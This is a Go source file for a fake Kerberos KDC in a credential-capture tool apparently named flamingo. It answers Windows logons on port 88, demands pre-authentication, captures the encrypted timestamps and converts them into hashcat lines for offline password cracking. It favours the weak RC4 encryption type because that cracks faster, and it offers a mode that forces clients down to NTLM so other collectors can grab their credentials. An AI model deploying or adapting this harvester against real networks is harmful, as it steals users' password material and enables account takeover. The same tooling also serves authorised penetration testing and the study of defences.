package flamingo

import (
	"encoding/asn1"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"

	log "github.com/sirupsen/logrus"
)

// A fake Kerberos KDC. A Windows client that is about to authenticate to a
// service asks the KDC for a ticket first, and the AS-REQ it sends carries
// PA-ENC-TIMESTAMP: the current time encrypted with a key derived from the
// user's password. That ciphertext is offline-crackable, which is the whole
// point of this listener.
//
// Clients only send pre-authentication after the KDC demands it, so the first
// AS-REQ usually arrives bare and is answered with KDC_ERR_PREAUTH_REQUIRED
// plus the PA-ETYPE-INFO2 hint that tells the client which encryption types
// and salt to use. The client then retries with the timestamp, and that
// second message is the one worth recording.
//
// The ASN.1 here is decoded with the standard library rather than a Kerberos
// library: the gokrb5 tree vendored inside github.com/mandiant/gopacket is a
// fit for the job, but reaching it drags six modules (jcmturner/gofork,
// aescts, dnsutils, rpc, hashicorp/go-uuid) into go.sum that nothing else in
// flamingo needs. Only the handful of RFC 4120 structures this listener
// touches are declared below, and only the fields it reads.

// Kerberos message types, which are also the ASN.1 application tag numbers
// the messages are wrapped in (RFC 4120 section 5.4.1).
const (
	kerberosMsgASReq    = 10
	kerberosMsgASRep    = 11
	kerberosMsgTGSReq   = 12
	kerberosMsgTGSRep   = 13
	kerberosMsgAPReq    = 14
	kerberosMsgAPRep    = 15
	kerberosMsgSafe     = 20
	kerberosMsgPriv     = 21
	kerberosMsgCred     = 22
	kerberosMsgKRBError = 30
)

// kerberosMessageNames gives each message type a name for the observation
// records written for anything that is not an AS-REQ.
var kerberosMessageNames = map[int]string{
	kerberosMsgASReq:    "as-req",
	kerberosMsgASRep:    "as-rep",
	kerberosMsgTGSReq:   "tgs-req",
	kerberosMsgTGSRep:   "tgs-rep",
	kerberosMsgAPReq:    "ap-req",
	kerberosMsgAPRep:    "ap-rep",
	kerberosMsgSafe:     "krb-safe",
	kerberosMsgPriv:     "krb-priv",
	kerberosMsgCred:     "krb-cred",
	kerberosMsgKRBError: "krb-error",
}

// Pre-authentication data types (RFC 4120 section 7.5.2).
const (
	kerberosPATypeEncTimestamp int32 = 2
	kerberosPATypeETypeInfo2   int32 = 19
)

// Principal name types (RFC 4120 section 6.2).
const (
	kerberosNameTypePrincipal int32 = 1
	kerberosNameTypeSrvInst   int32 = 2
)

// Encryption types flamingo can turn into a hashcat line (RFC 3961/4757).
const (
	kerberosEtypeAES128  int32 = 17
	kerberosEtypeAES256  int32 = 18
	kerberosEtypeRC4HMAC int32 = 23
)

// Hashcat modes for AS-REQ pre-authentication material.
const (
	KerberosHashcatModePreAuthRC4    = 7500
	KerberosHashcatModePreAuthAES128 = 19800
	KerberosHashcatModePreAuthAES256 = 19900
)

// Kerberos error codes sent back to clients (RFC 4120 section 7.5.9).
const (
	kerberosErrEtypeNoSupp     int32 = 14
	kerberosErrPreAuthFailed   int32 = 24
	kerberosErrPreAuthRequired int32 = 25
)

// kerberosPVNO is the Kerberos protocol version every message carries.
const kerberosPVNO = 5

// kerberosEtypePreference is the order PA-ETYPE-INFO2 offers encryption types
// in. RC4-HMAC comes first because its pre-auth blob cracks an order of
// magnitude faster than the AES ones; the list is always intersected with
// what the client actually offered, so a client with RC4 disabled still gets
// an etype it can use.
var kerberosEtypePreference = []int32{kerberosEtypeRC4HMAC, kerberosEtypeAES256, kerberosEtypeAES128}

// Per-message limits. A KDC exchange is two small messages, so cap the frame
// size and the number of messages a single connection may send.
const (
	kerberosMaxMessage  = 64 * 1024
	kerberosMaxMessages = 8
	kerberosTimeout     = 30 * time.Second
)

// ConfKerberos holds the configuration for a Kerberos KDC capture server.
type ConfKerberos struct {
	BindPort     uint16
	BindHost     string
	RecordWriter *RecordWriter

	// Realm is the Kerberos realm this KDC claims to serve. It is only used
	// when a client's AS-REQ carries no realm of its own; otherwise the
	// client's realm is echoed back, because that is what the client
	// expects to see and what the hashcat line has to name.
	Realm string

	// ForceNTLM answers every AS-REQ with KDC_ERR_ETYPE_NOSUPP instead of
	// asking for pre-authentication. A Windows client that cannot agree on
	// an encryption type with the KDC falls back to NTLM, where flamingo's
	// SMB, HTTP and LDAP collectors are waiting. Pre-authentication that
	// does arrive is still recorded before the error goes out.
	ForceNTLM bool

	shutdown bool
	listener net.Listener
	packet   net.PacketConn
	m        sync.Mutex
}

// NewConfKerberos creates a default configuration for the Kerberos capture server.
func NewConfKerberos() *ConfKerberos {
	return &ConfKerberos{
		BindPort: 88,
		BindHost: "[::]",
		Realm:    "FLAMINGO.LOCAL",
	}
}

// IsShutdown checks to see if the service is shutting down.
func (c *ConfKerberos) IsShutdown() bool {
	c.m.Lock()
	defer c.m.Unlock()
	return c.shutdown
}

// Shutdown flags the service to shut down.
func (c *ConfKerberos) Shutdown() {
	c.m.Lock()
	defer c.m.Unlock()
	if c.shutdown {
		return
	}
	c.shutdown = true
	if c.listener != nil {
		c.listener.Close()
	}
	if c.packet != nil {
		c.packet.Close()
	}
}

// SpawnKerberos starts a logging Kerberos KDC on both TCP and UDP. Clients
// pick either transport on their own: TCP frames every message with a 4-byte
// big-endian length prefix, UDP carries one bare message per datagram.
func SpawnKerberos(c *ConfKerberos) error {
	addr := fmt.Sprintf("%s:%d", c.BindHost, c.BindPort)

	listener, err := net.Listen("tcp", addr)
	if err != nil {
		return err
	}
	packet, err := net.ListenPacket("udp", addr)
	if err != nil {
		listener.Close()
		return err
	}

	c.m.Lock()
	c.listener = listener
	c.packet = packet
	c.m.Unlock()

	log.Debugf("kerberos is listening on %s:%d (tcp and udp)", c.BindHost, c.BindPort)
	go kerberosStartTCP(c)
	go kerberosStartUDP(c)
	return nil
}

func kerberosStartTCP(c *ConfKerberos) {
	for !c.IsShutdown() {
		conn, err := c.listener.Accept()
		if err != nil {
			continue
		}
		go kerberosHandleConnection(c, conn)
	}
}

func kerberosStartUDP(c *ConfKerberos) {
	buff := make([]byte, kerberosMaxMessage)
	for !c.IsShutdown() {
		rlen, raddr, err := c.packet.ReadFrom(buff)
		if err != nil {
			continue
		}
		// Datagrams are answered in line: a KDC reply is built from the
		// request alone, so there is nothing to gain from a goroutine per
		// packet and plenty to lose to a flood.
		resp := kerberosSafeProcess(c, raddr, buff[:rlen])
		if len(resp) == 0 {
			continue
		}
		c.packet.SetWriteDeadline(time.Now().Add(kerberosTimeout))
		if _, err := c.packet.WriteTo(resp, raddr); err != nil {
			log.Debugf("kerberos failed to answer %s: %s", raddr, err)
		}
	}
	log.Debugf("kerberos server on %s:%d is shutting down", c.BindHost, c.BindPort)
}

// kerberosHandleConnection reads length-prefixed messages from one TCP client
// until it stops talking, the deadline expires or a reply ends the exchange.
func kerberosHandleConnection(c *ConfKerberos, conn net.Conn) {
	defer conn.Close()

	// One deadline for the whole exchange, not one per message: a client
	// cannot keep a goroutine alive by trickling frames.
	conn.SetDeadline(time.Now().Add(kerberosTimeout))

	for i := 0; i < kerberosMaxMessages; i++ {
		msg, err := kerberosReadMessage(conn)
		if err != nil {
			if err != io.EOF {
				log.Debugf("kerberos read from %s: %s", conn.RemoteAddr(), err)
			}
			return
		}
		resp := kerberosSafeProcess(c, conn.RemoteAddr(), msg)
		if len(resp) == 0 {
			return
		}
		if err := kerberosWriteMessage(conn, resp); err != nil {
			return
		}
	}
}

// kerberosReadMessage reads one message off a TCP connection. RFC 4120
// section 7.2.2 prefixes each one with its length in four big-endian bytes
// and reserves the top bit of that field.
func kerberosReadMessage(conn net.Conn) ([]byte, error) {
	var hdr [4]byte
	if _, err := io.ReadFull(conn, hdr[:]); err != nil {
		return nil, err
	}
	n := binary.BigEndian.Uint32(hdr[:])
	if n&0x80000000 != 0 {
		return nil, errors.New("reserved bit set in length prefix")
	}
	if n == 0 || n > kerberosMaxMessage {
		return nil, fmt.Errorf("bad message length %d", n)
	}
	msg := make([]byte, n)
	if _, err := io.ReadFull(conn, msg); err != nil {
		return nil, err
	}
	return msg, nil
}

// kerberosWriteMessage sends one length-prefixed message.
func kerberosWriteMessage(conn net.Conn, msg []byte) error {
	b := binary.BigEndian.AppendUint32(make([]byte, 0, 4+len(msg)), uint32(len(msg)))
	_, err := conn.Write(append(b, msg...))
	return err
}

// kerberosSafeProcess runs the decoder for one message and turns a panic on
// malformed input into a dropped message.
func kerberosSafeProcess(c *ConfKerberos, src net.Addr, data []byte) (resp []byte) {
	defer func() {
		if r := recover(); r != nil {
			log.Debugf("kerberos decoder panic with data %x: %q", data, r)
			resp = nil
		}
	}()
	return kerberosProcess(c, src, data)
}

// kerberosProcess decodes one Kerberos message and returns the reply to send,
// or nil to send nothing.
func kerberosProcess(c *ConfKerberos, src net.Addr, data []byte) []byte {
	if len(data) == 0 {
		return nil
	}

	req, err := kerberosParseASReq(data)
	if err != nil {
		// Anything that is not an AS-REQ is still worth knowing about: a
		// TGS-REQ means a client already holds a ticket from the real KDC,
		// and an unparseable message means a client flamingo cannot serve.
		typ, name := kerberosDescribe(data)
		fields := map[string]string{
			"message": name,
			"bytes":   strconv.Itoa(len(data)),
		}
		if typ != 0 {
			fields["msg_type"] = strconv.Itoa(typ)
		}
		if typ == kerberosMsgASReq || typ == 0 {
			fields["error"] = err.Error()
		}
		c.observe(src, fields)
		return nil
	}

	return c.handleASReq(src, req)
}

// handleASReq records whatever an AS-REQ carries and picks the error that
// gets the client to send more.
func (c *ConfKerberos) handleASReq(src net.Addr, req *kerberosASReq) []byte {
	cname := kerberosJoinName(req.Body.CName.NameString)
	realm := req.Body.Realm
	if realm == "" {
		realm = c.Realm
	}

	pa, found := kerberosFindPAData(req.PAData, kerberosPATypeEncTimestamp)
	if !found {
		// The opening probe of every Kerberos logon. Demanding
		// pre-authentication is what makes the client encrypt a timestamp
		// with the user's key and send it along on the retry.
		fields := map[string]string{
			"message": "as-req",
			"realm":   realm,
			"preauth": "false",
		}
		if cname != "" {
			fields["username"] = cname
		}

		// Asking for pre-authentication is only worth it when the client
		// offers an encryption type flamingo can crack, and in ForceNTLM
		// mode never: refusing the encryption types outright is what sends
		// a Windows client back to NTLM.
		etypes := kerberosOfferedEtypes(req.Body.EType)
		if c.ForceNTLM || len(etypes) == 0 {
			fields["answer"] = "KDC_ERR_ETYPE_NOSUPP"
			c.observe(src, fields)
			return c.krbError(req, realm, kerberosErrEtypeNoSupp)
		}

		fields["answer"] = "KDC_ERR_PREAUTH_REQUIRED"
		c.observe(src, fields)
		return c.krbErrorWithData(req, realm, kerberosErrPreAuthRequired,
			kerberosPreAuthMethodData(etypes, realm+cname))
	}

	enc, err := kerberosParseEncryptedData(pa)
	if err != nil {
		log.Debugf("kerberos bad PA-ENC-TIMESTAMP from %s: %s", src, err)
		c.observe(src, map[string]string{
			"message": "as-req",
			"realm":   realm,
			"preauth": "true",
			"error":   err.Error(),
		})
		return c.krbError(req, realm, kerberosErrPreAuthFailed)
	}

	c.recordPreAuth(src, cname, realm, enc)

	// There is no AS-REP to send: flamingo does not know the user's key, so
	// it cannot encrypt one. KDC_ERR_PREAUTH_FAILED is what a real KDC
	// answers a wrong password with, and it ends the exchange cleanly.
	code := kerberosErrPreAuthFailed
	if c.ForceNTLM {
		code = kerberosErrEtypeNoSupp
	}
	return c.krbError(req, realm, code)
}

// recordPreAuth writes a captured PA-ENC-TIMESTAMP to the record writer.
func (c *ConfKerberos) recordPreAuth(src net.Addr, cname, realm string, enc *kerberosEncryptedData) {
	fields := map[string]string{
		"_server":   fmt.Sprintf("%s:%d", c.BindHost, c.BindPort),
		"username":  cname,
		"realm":     realm,
		"etype":     strconv.Itoa(int(enc.EType)),
		"transport": kerberosTransport(src),
	}
	if name := kerberosEtypeName(enc.EType); name != "" {
		fields["etype_name"] = name
	}
	if line, mode := KerberosPreAuthHashcat(cname, realm, enc.EType, enc.Cipher); line != "" {
		fields["hashcat"] = line
		fields["hashcat_mode"] = strconv.Itoa(mode)
	} else {
		// An encryption type with no hashcat layout still leaves the
		// ciphertext, which is better kept than dropped.
		fields["cipher"] = hex.EncodeToString(enc.Cipher)
	}
	c.RecordWriter.Record("credential", "kerberos", src.String(), fields)
}

// observe writes a record for a message that carried no credential.
func (c *ConfKerberos) observe(src net.Addr, fields map[string]string) {
	fields["_server"] = fmt.Sprintf("%s:%d", c.BindHost, c.BindPort)
	fields["transport"] = kerberosTransport(src)
	c.RecordWriter.Record("query", "kerberos", src.String(), fields)
}

// kerberosTransport names the transport a message arrived over.
func kerberosTransport(src net.Addr) string {
	if src == nil {
		return ""
	}
	return src.Network()
}

// KerberosPreAuthHashcat formats the encrypted timestamp from an AS-REQ
// PA-ENC-TIMESTAMP as a hashcat line and returns the mode that cracks it:
//
//	etype 23 (RC4-HMAC) -> 7500,  $krb5pa$23$user$realm$dummy$<cipher>
//	etype 17 (AES128)   -> 19800, $krb5pa$17$user$realm$<cipher>
//	etype 18 (AES256)   -> 19900, $krb5pa$18$user$realm$<cipher>
//
// The RC4 layout is the odd one. RFC 4757 puts the 16-byte HMAC checksum in
// front of the ciphertext, and hashcat's 7500 parser expects it at the end,
// so the hex string is rotated by its first 32 characters. Its salt field is
// the literal "dummy" because RC4-HMAC derives its key from the NT hash
// alone and never salts it. An encryption type with no known layout, or an
// empty ciphertext, yields an empty line and a zero mode.
func KerberosPreAuthHashcat(user, realm string, etype int32, cipher []byte) (string, int) {
	if len(cipher) == 0 {
		return "", 0
	}
	h := hex.EncodeToString(cipher)
	switch etype {
	case kerberosEtypeRC4HMAC:
		if len(h) <= 32 {
			return "", 0
		}
		return fmt.Sprintf("$krb5pa$23$%s$%s$dummy$%s", user, realm, h[32:]+h[:32]),
			KerberosHashcatModePreAuthRC4
	case kerberosEtypeAES128:
		return fmt.Sprintf("$krb5pa$17$%s$%s$%s", user, realm, h),
			KerberosHashcatModePreAuthAES128
	case kerberosEtypeAES256:
		return fmt.Sprintf("$krb5pa$18$%s$%s$%s", user, realm, h),
			KerberosHashcatModePreAuthAES256
	}
	return "", 0
}

// kerberosEtypeName names the encryption types flamingo cracks.
func kerberosEtypeName(etype int32) string {
	switch etype {
	case kerberosEtypeAES128:
		return "aes128-cts-hmac-sha1-96"
	case kerberosEtypeAES256:
		return "aes256-cts-hmac-sha1-96"
	case kerberosEtypeRC4HMAC:
		return "rc4-hmac"
	}
	return ""
}

// kerberosOfferedEtypes intersects the client's encryption type list with the
// ones flamingo can crack, in flamingo's order of preference.
func kerberosOfferedEtypes(offered []int32) []int32 {
	var out []int32
	for _, want := range kerberosEtypePreference {
		for _, have := range offered {
			if have == want {
				out = append(out, want)
				break
			}
		}
	}
	return out
}

// kerberosJoinName renders a PrincipalName as a single string.
func kerberosJoinName(name []string) string {
	return strings.Join(name, "/")
}

// kerberosFindPAData returns the value of the first pre-authentication entry
// of the given type.
func kerberosFindPAData(pas []kerberosPAData, typ int32) ([]byte, bool) {
	for _, pa := range pas {
		if pa.Type == typ {
			return pa.Value, true
		}
	}
	return nil, false
}

// kerberosDescribe reports the message type of something that did not decode
// as an AS-REQ. Every Kerberos message is wrapped in an ASN.1 application tag
// whose number is also its message type.
func kerberosDescribe(data []byte) (int, string) {
	var raw asn1.RawValue
	if _, err := asn1.Unmarshal(data, &raw); err != nil || raw.Class != asn1.ClassApplication {
		return 0, "unknown"
	}
	if name, ok := kerberosMessageNames[raw.Tag]; ok {
		return raw.Tag, name
	}
	return raw.Tag, "unknown"
}

// RFC 4120 section 5.4.1, KDC-REQ. Only the fields this listener reads are
// declared, and all of them are optional so that one unexpected element does
// not cost the whole message.

type kerberosPAData struct {
	Type  int32  `asn1:"explicit,tag:1"`
	Value []byte `asn1:"explicit,tag:2"`
}

type kerberosPrincipalName struct {
	NameType   int32    `asn1:"explicit,optional,tag:0"`
	NameString []string `asn1:"explicit,optional,tag:1"`
}

// kerberosReqBody is KDC-REQ-BODY. Fields flamingo never looks at are kept as
// raw values so that decoding does not depend on their contents.
type kerberosReqBody struct {
	KDCOptions        asn1.BitString        `asn1:"explicit,optional,tag:0"`
	CName             kerberosPrincipalName `asn1:"explicit,optional,tag:1"`
	Realm             string                `asn1:"explicit,optional,tag:2"`
	SName             kerberosPrincipalName `asn1:"explicit,optional,tag:3"`
	From              time.Time             `asn1:"generalized,explicit,optional,tag:4"`
	Till              time.Time             `asn1:"generalized,explicit,optional,tag:5"`
	RTime             time.Time             `asn1:"generalized,explicit,optional,tag:6"`
	Nonce             int64                 `asn1:"explicit,optional,tag:7"`
	EType             []int32               `asn1:"explicit,optional,tag:8"`
	Addresses         asn1.RawValue         `asn1:"explicit,optional,tag:9"`
	EncAuthData       asn1.RawValue         `asn1:"explicit,optional,tag:10"`
	AdditionalTickets asn1.RawValue         `asn1:"explicit,optional,tag:11"`
}

// kerberosASReqMsg is the wire form of an AS-REQ. The request body stays raw
// because it is decoded separately: a body flamingo cannot read should not
// hide the pre-authentication data that sits beside it.
type kerberosASReqMsg struct {
	PVNO    int              `asn1:"explicit,optional,tag:1"`
	MsgType int              `asn1:"explicit,tag:2"`
	PAData  []kerberosPAData `asn1:"explicit,optional,tag:3"`
	ReqBody asn1.RawValue    `asn1:"explicit,tag:4"`
}

// kerberosASReq is a decoded AS-REQ.
type kerberosASReq struct {
	PVNO    int
	MsgType int
	PAData  []kerberosPAData
	Body    kerberosReqBody
}

// kerberosEncryptedData is RFC 4120 section 5.2.9 EncryptedData, which is
// also the whole of PA-ENC-TIMESTAMP.
type kerberosEncryptedData struct {
	EType  int32  `asn1:"explicit,tag:0"`
	KVNO   int    `asn1:"explicit,optional,tag:1"`
	Cipher []byte `asn1:"explicit,tag:2"`
}

// kerberosParseASReq decodes an AS-REQ and its request body.
func kerberosParseASReq(data []byte) (*kerberosASReq, error) {
	var msg kerberosASReqMsg
	if _, err := asn1.UnmarshalWithParams(data, &msg,
		fmt.Sprintf("application,explicit,tag:%d", kerberosMsgASReq)); err != nil {
		return nil, err
	}
	if msg.MsgType != kerberosMsgASReq {
		return nil, fmt.Errorf("message type %d is not an AS-REQ", msg.MsgType)
	}
	req := &kerberosASReq{PVNO: msg.PVNO, MsgType: msg.MsgType, PAData: msg.PAData}
	if _, err := asn1.Unmarshal(msg.ReqBody.Bytes, &req.Body); err != nil {
		return nil, fmt.Errorf("bad AS-REQ body: %s", err)
	}
	return req, nil
}

// kerberosParseEncryptedData decodes a PA-ENC-TIMESTAMP value.
func kerberosParseEncryptedData(b []byte) (*kerberosEncryptedData, error) {
	var enc kerberosEncryptedData
	if _, err := asn1.Unmarshal(b, &enc); err != nil {
		return nil, err
	}
	if len(enc.Cipher) == 0 {
		return nil, errors.New("empty PA-ENC-TIMESTAMP ciphertext")
	}
	return &enc, nil
}

// The encoding side. KerberosString is an ASN.1 GeneralString, which the
// standard library decodes but will not encode, so every string flamingo
// writes goes out as an explicit raw value.

type kerberosPrincipalNameEnc struct {
	NameType   int32           `asn1:"explicit,tag:0"`
	NameString []asn1.RawValue `asn1:"explicit,tag:1"`
}

type kerberosErrorEnc struct {
	PVNO      int                      `asn1:"explicit,tag:0"`
	MsgType   int                      `asn1:"explicit,tag:1"`
	STime     time.Time                `asn1:"generalized,explicit,tag:4"`
	Susec     int                      `asn1:"explicit,tag:5"`
	ErrorCode int32                    `asn1:"explicit,tag:6"`
	CRealm    asn1.RawValue            `asn1:"optional"`
	CName     kerberosPrincipalNameEnc `asn1:"explicit,optional,tag:8"`
	Realm     asn1.RawValue
	SName     kerberosPrincipalNameEnc `asn1:"explicit,tag:10"`
	EData     []byte                   `asn1:"explicit,optional,tag:12"`
}

type kerberosPADataEnc struct {
	Type  int32  `asn1:"explicit,tag:1"`
	Value []byte `asn1:"explicit,tag:2"`
}

type kerberosETypeInfo2EntryEnc struct {
	EType int32         `asn1:"explicit,tag:0"`
	Salt  asn1.RawValue `asn1:"optional"`
}

// kerberosGeneralString wraps a string as an ASN.1 GeneralString value.
func kerberosGeneralString(s string) asn1.RawValue {
	return asn1.RawValue{
		Class: asn1.ClassUniversal,
		Tag:   asn1.TagGeneralString,
		Bytes: []byte(s),
	}
}

// kerberosTaggedString encodes a KerberosString inside the explicit context
// tag of the field that holds it. The standard library ignores the asn1 tag
// parameters of a raw value when encoding, so the whole [tag] { GeneralString }
// construct has to be built here rather than declared on the field.
func kerberosTaggedString(tag int, s string) asn1.RawValue {
	inner, err := asn1.Marshal(kerberosGeneralString(s))
	if err != nil {
		// A GeneralString is bytes and a length; this cannot fail.
		log.Debugf("kerberos failed to encode string %q: %s", s, err)
		return asn1.RawValue{}
	}
	return asn1.RawValue{
		Class:      asn1.ClassContextSpecific,
		Tag:        tag,
		IsCompound: true,
		Bytes:      inner,
	}
}

// kerberosPrincipalNameValue builds a PrincipalName for the encoder.
func kerberosPrincipalNameValue(nameType int32, parts ...string) kerberosPrincipalNameEnc {
	name := kerberosPrincipalNameEnc{NameType: nameType}
	for _, p := range parts {
		name.NameString = append(name.NameString, kerberosGeneralString(p))
	}
	return name
}

// krbError builds a KRB-ERROR reply to an AS-REQ.
func (c *ConfKerberos) krbError(req *kerberosASReq, realm string, code int32) []byte {
	return c.krbErrorWithData(req, realm, code, nil)
}

// krbErrorWithData builds a KRB-ERROR reply carrying optional e-data. The
// client principal is echoed back when the request named one, and the service
// principal is the one the client asked for, falling back to the krbtgt of
// the realm, which is what an AS-REQ is always really after.
func (c *ConfKerberos) krbErrorWithData(req *kerberosASReq, realm string, code int32, edata []byte) []byte {
	now := time.Now().UTC()
	e := kerberosErrorEnc{
		PVNO:      kerberosPVNO,
		MsgType:   kerberosMsgKRBError,
		STime:     now.Truncate(time.Second),
		Susec:     now.Nanosecond() / int(time.Microsecond),
		ErrorCode: code,
		Realm:     kerberosTaggedString(9, realm),
		SName:     kerberosPrincipalNameValue(kerberosNameTypeSrvInst, "krbtgt", realm),
		EData:     edata,
	}
	if req != nil {
		if parts := req.Body.SName.NameString; len(parts) > 0 {
			e.SName = kerberosPrincipalNameValue(req.Body.SName.NameType, parts...)
		}
		if parts := req.Body.CName.NameString; len(parts) > 0 {
			e.CName = kerberosPrincipalNameValue(req.Body.CName.NameType, parts...)
			e.CRealm = kerberosTaggedString(7, realm)
		}
	}

	body, err := asn1.Marshal(e)
	if err != nil {
		log.Debugf("kerberos failed to encode KRB-ERROR: %s", err)
		return nil
	}
	msg, err := asn1.Marshal(asn1.RawValue{
		Class:      asn1.ClassApplication,
		Tag:        kerberosMsgKRBError,
		IsCompound: true,
		Bytes:      body,
	})
	if err != nil {
		log.Debugf("kerberos failed to wrap KRB-ERROR: %s", err)
		return nil
	}
	return msg
}

// kerberosPreAuthMethodData builds the METHOD-DATA sent as the e-data of a
// KDC_ERR_PREAUTH_REQUIRED error: the PA-ENC-TIMESTAMP the client is being
// asked for, and the PA-ETYPE-INFO2 entries telling it which encryption types
// and salt to derive its key with. Without the hint a client has to guess the
// salt, and the retry that carries the credential may never arrive.
func kerberosPreAuthMethodData(etypes []int32, salt string) []byte {
	var entries []kerberosETypeInfo2EntryEnc
	for _, etype := range etypes {
		entry := kerberosETypeInfo2EntryEnc{EType: etype}
		// RC4-HMAC derives its key from the NT hash and ignores the salt;
		// sending one anyway confuses some clients.
		if etype != kerberosEtypeRC4HMAC {
			entry.Salt = kerberosTaggedString(1, salt)
		}
		entries = append(entries, entry)
	}
	info, err := asn1.Marshal(entries)
	if err != nil {
		log.Debugf("kerberos failed to encode PA-ETYPE-INFO2: %s", err)
		return nil
	}
	data, err := asn1.Marshal([]kerberosPADataEnc{
		{Type: kerberosPATypeEncTimestamp},
		{Type: kerberosPATypeETypeInfo2, Value: info},
	})
	if err != nil {
		log.Debugf("kerberos failed to encode METHOD-DATA: %s", err)
		return nil
	}
	return data
}
